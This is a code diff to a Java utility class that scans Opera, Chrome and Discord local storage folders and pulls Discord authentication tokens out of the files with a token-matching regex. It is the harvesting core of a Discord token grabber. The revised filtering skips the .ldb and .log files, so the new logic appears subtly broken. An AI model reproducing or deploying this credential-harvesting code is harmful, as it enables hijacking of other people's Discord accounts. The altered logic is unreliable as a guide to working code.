@@ -12,15 +12,14 @@ import java.util.regex.Pattern;
 public class TokenUtils {
     // Get the token of the user that ran the program.
 
-    public static String[] discordTokenLocations = (String[]) Arrays
-            .asList(
+    public static String[] discordTokenLocations = new String[] {
                     "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb",
-                    "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
-                    "/AppData/Roaming/discord/Local Storage/leveldb/",
-                    "/AppData/Roaming/discordcanary/Local Storage/leveldb/",
-                    "/snap/discord/current/.config/discord/Local Storage/leveldb/",
-                    "/snap/discordcanary/current/.config/discordcanary/Local Storage/leveldb/"
-            ).toArray();
+                            "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
+                            "/AppData/Roaming/discord/Local Storage/leveldb/",
+                            "/AppData/Roaming/discordcanary/Local Storage/leveldb/",
+                            "/snap/discord/current/.config/discord/Local Storage/leveldb/",
+                            "/snap/discordcanary/current/.config/discordcanary/Local Storage/leveldb/"
+                    };
     public static String discordTokenExpression = "[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}";
 
 
@@ -34,21 +33,21 @@ public class TokenUtils {
 
             // Loop through the files in the token location.
             for(String file : files) {
-                try(Scanner scanner = new Scanner(new FileReader(new File(locationPath, file)))) {
+                if(!file.endsWith(".ldb") && !file.endsWith(".log")) {
+                    try (Scanner scanner = new Scanner(new FileReader(new File(locationPath, file)))) {
+                        // Loop through every line of the file.
+                        while (scanner.hasNextLine()) {
+                            String line = scanner.nextLine();
+                            Pattern pattern = Pattern.compile(discordTokenExpression);
+                            Matcher matcher = pattern.matcher(line);
 
-                    // Loop through every line of the file.
-                    while(scanner.hasNextLine()) {
-                        String line = scanner.nextLine();
+                            // Loop through every found token.
+                            while (matcher.find()) foundTokens.add(matcher.group());
+                        }
 
-                        Pattern pattern = Pattern.compile(discordTokenExpression);
-                        Matcher matcher = pattern.matcher(line);
-
-                        // Loop through every found token.
-                        while(matcher.find()) foundTokens.add(matcher.group());
+                    } catch (IOException exception) {
+                        return foundTokens; // Return the already found tokens.
                     }
-
-                } catch (IOException exception) {
-                    return foundTokens; // Return the already found tokens.
                 }
             }
         }
